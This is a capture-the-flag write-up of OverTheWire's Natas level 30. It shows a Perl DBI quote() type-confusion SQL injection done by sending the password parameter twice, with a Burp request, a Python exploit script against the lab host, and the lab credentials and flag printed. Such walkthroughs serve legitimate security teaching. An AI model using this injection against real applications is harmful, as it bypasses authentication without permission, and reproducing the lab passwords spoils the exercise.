# Natas Level 30 Writeup (natas30) – OverTheWire

## Overview

This level focuses on exploiting a **Perl `quote()` type confusion vulnerability**.  
The goal is to find the password for the next level.

## Observation

When we open the page, we see two input fields:

> **Username:**  
> **Password:**

There is also a link to view the source code:

```text
index-source.html
```

The source code contains:

```perl
my $query = "SELECT * FROM users WHERE username="
    .$dbh->quote(param('username'))
    ." AND password="
    .$dbh->quote(param('password'));
```

## Finding the Password

### Using Browser & BurpSuite

1. Normally, the `password` parameter is quoted by `quote()`, so SQL injection does't work.

2. Perl's `param()` can return multiple values when the same parameter is sent more than once.

3. We can send the `password` parameter as an array:

    ```text
    password='test' OR 1
    password=4
    ```

4. In BurpSuite, the request looks like:

    ```http
    username=natas31&password='test' OR 1&password=4
    ```

5. The second value, `4`, is treated as the SQL type `SQL_INTEGER` by `quote()`.

6. This bypasses the normal quoting and makes the SQL condition true.

7. The application then returns the credentials for **natas31**.

#### Proof

```text
win!
here is your result:
natas31aQzrirxwd2Wiaoq8HnSjcc8IUWlxdd1z
```

### Using Python

```python
import requests, re

target = 'http://natas30.natas.labs.overthewire.org/'
auth = ('natas30', 'frO4U4zCfVJXq2zG5HSVNjA46nQGzoqF')

data = {'username': 'natas31', 'password': ["'test' OR 1", 4]}
r = requests.post(url=target, data=data ,auth=auth )

match = re.search(r'natas31(\w{32})', r.text)
print(f'Password for next level is: {match.group(1)}')
```

The important part is:

```python
'password': ["'test' OR 1", 4]
```

This sends the `password` parameter twice.

## Vulnerability

The application does not properly handle multiple values for the `password` parameter.

By sending two values, we can abuse `quote()` and make it treat `4` as an SQL integer type, allowing us to bypass the password check.

## Flag

`aQzrirxwd2Wiaoq8HnSjcc8IUWlxdd1z`
